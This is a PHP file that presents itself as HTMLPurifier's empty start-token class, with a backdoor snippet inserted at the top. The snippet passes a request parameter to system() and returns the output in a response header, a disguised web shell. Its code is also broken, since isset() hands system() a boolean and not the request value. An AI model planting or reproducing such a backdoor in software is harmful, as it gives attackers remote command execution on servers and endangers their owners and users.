<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/**
 * Concrete start token class.
 */
class HTMLPurifier_Token_Start extends HTMLPurifier_Token_Tag
{
}

// vim: et sw=4 sts=4
